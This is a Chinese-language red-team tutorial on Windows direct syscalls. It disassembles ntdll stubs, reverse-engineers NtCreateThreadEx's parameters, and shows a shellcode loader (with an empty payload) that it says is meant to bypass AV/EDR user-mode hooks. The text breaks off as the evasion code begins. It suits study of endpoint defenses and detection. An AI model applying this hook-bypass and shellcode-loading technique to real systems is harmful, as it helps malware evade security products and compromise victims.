浅谈syscall
Author：⽩袍
⼀、简介
Syscall 即 system call ，是最近在红队领域⽐较热⻔的⼀种⼿法，主要⽤来规避AV、EDR类
的设备检测。
Windows有两种处理器访问模式：⽤户模式和内核模式。使⽤Ring级来描述就是⽤户模式为
Ring 3，内核模式为Ring 0，如图：
⽤户的代码运⾏在⽤户模式下，⽽驱动程序和操作系统代码运⾏在内核模式下，两者相互隔
离，避免⽤户级别的代码影响到操作系统的稳定。
⽤户在调⽤⼀些与系统相关的API函数时，实际上是先从⽤户模式切换到内核模式，调⽤结束
后再回到⽤户模式，通过 Process Monitor 可以看到这个过程：
⽤户代码调⽤ CreateFile() ，它由 Kernel32.dll 导出，这⾥显示为 KernelBase.dll 是因为⾃
Windows 7和Windows Server 2008 R2开始，微软将⼀些功能进⾏了重定位，具体：新 Low-
Level ⼆进制⽂件 - Win32 apps | Microsoft Docs
可以看到之后调⽤了 ntdll.dll 的 ZwCreateFile() ，有时候是 NtCreateFile() ，两者对此处
代码来说区别不⼤。
进⼊内核模式后，还能看到调⽤了 ntoskrnl.exe 的 NtCreateFile() ，这次调⽤和上⼀次有什
么区别？
使⽤WinDbg来反汇编 ntdll!NtCreateFile :
0:001> x ntdll!NtCreateFile
00007ffc`6388d800 ntdll!NtCreateFile (NtCreateFile)
0:001> u 00007ffc`6388d800
ntdll!NtCreateFile:
00007ffc`6388d800 4c8bd1          mov     r10,rcx
00007ffc`6388d803 b855000000      mov     eax,55h
00007ffc`6388d808 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 
(00000000`7ffe0308)],1
00007ffc`6388d810 7503            jne     ntdll!NtCreateFile+0x15 
(00007ffc`6388d815)
00007ffc`6388d812 0f05            syscall
00007ffc`6388d814 c3              ret
00007ffc`6388d815 cd2e            int     2Eh
00007ffc`6388d817 c3              ret
可以看到 ntdll!NtCreateFile ⾮常简短，⾸先将函数参数放⼊寄存器，之后将 CreateFile()
对应的系统服务号 0x0055 放⼊ eax 中，微软没有公开这些服务号的对应关系，但有⼤佬整理
了⼀份：Windows X86-64 System Call Table (XP/2003/Vista/2008/7/2012/8/10).
之后有⼀个 syscall 指令（X86系统使⽤ sysenter ），它将把函数参数复制到内核模式寄存器
中，再执⾏ CreateFile() 的内核版本，调⽤完成后，返回值给⽤户模式的应⽤程序。
现在可以得到答案了， ntdll.dll 的 NtCreateFile() 仅仅只是⼀层封装，真正的实现在
ntoskrnl.exe 中。
⼆、使⽤Syscall
许多EDR类防护设备会对敏感的API进⾏hook，但有可能只是hook了Ring 3级别的API，通过
直接进⾏系统调⽤就能绕过hook.
1. 剖析函数定义
以⼀个简单的shellcode加载器为例：
#include "stdafx.h"
#include "Windows.h"
int main()
{
    unsigned char shellcode[] = ""; // calc x64
    void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, 
PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof shellcode);
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, 0, 0, NULL);
    Sleep(1000);
    return 0;
}
观察 CreateThread() 的调⽤栈：
依次为： kernel32!CreateFile -> KernelBase!CreateRemoteThreadEx -> ntdll!
NtCreateThreadEx
利⽤IDA打开 kernel32.dll ，能看到 CreateFile 实际上是 CreateThreadStub ，调⽤了
CreateRemoteThreadEx ：
同样打开 KernelBase.dll ，可以找到 NtCreateThreadEx 在 CreateRemoteThreadEx ⾥被调⽤：
微软并没有提供 NtCreateThreadEx 的⽂档，所以需要我们⾃⼰去分析此函数的参数都有哪
些：
  v13 = NtCreateThreadEx(
          &ThreadHandle,
          0x1FFFFFi64,
          v37,
          hProcess,
          v36,
          v35,
          v14,
          0i64,
          v15,
          v34 & -(__int64)(v10 != 0),
          v45);
x64平台代码默认的调⽤约定是最左边 4 个位置的整数值参数从左到右分别在 RCX、RDX、
R8 和 R9 中传递，第 5 个和更⾼位置的参数在堆栈上依次传递。
 参数⼀为 &ThreadHandle
 参数⼆为 0x1FFFFFi64
 参数三为 v37 ，在IDA⾥能够看到：
v9 = BaseFormatObjectAttributes(&v44, lpThreadAttributes, 0i64, &v37);
跟⼊ BaseFormatObjectAttributes ：
如果 a3 为0，那么 a4 也将为0，所以 v37 为0.
 参数四为 hProcess
 参数五为 v36 ，即 lpStartAddress ，压栈地址为 rsp+20h ，此时已经调⽤了 call 指令，被调
函数的返回地址⼊栈， rsp-8 ，所以最终的参数地址为 rsp+28h ，参数五的值是
0000018b8ac60000 ：
 参数六为 v35 ，即 lpParameter ，值为0
 参数七为 v14 ，有⼀个判断流程，值为0：
 参数⼋值为0，
 参数九为 v15 ，值也为0
 参数⼗为 v34 & -(__int64)(v10 != 0) ，值为0
 参数⼗⼀为 v45 ，是⼀个数组
最终，得到 NtCreateThreadEx 的定义为：
typedef NTSTATUS(NTAPI* pfnNtCreateThreadEx)
(
    OUT PHANDLE hThread,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN PVOID lpStartAddress,
    IN PVOID lpParameter,
    IN ULONG Flags,
    IN SIZE_T StackZeroBits,
    IN SIZE_T SizeOfStackCommit,
    IN SIZE_T SizeOfStackReserve,
    OUT PVOID lpBytesBuffer
);
2. 直接调⽤NtCreateThreadEx
现在我们要越过 CreateThread() 直接调⽤ NtCreateThreadEx() ，以规避EDR对⽤户层API函
数的hook，下⾯是实现代码：
#include 
#include 
typedef NTSTATUS(NTAPI* pfnNtCreateThreadEx)
(
    OUT PHANDLE hThread,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN PVOID lpStartAddress,
    IN PVOID lpParameter,
    IN ULONG Flags,
    IN SIZE_T StackZeroBits,
    IN SIZE_T SizeOfStackCommit,
    IN SIZE_T SizeOfStackReserve,
    OUT PVOID lpBytesBuffer
    );
int main()
{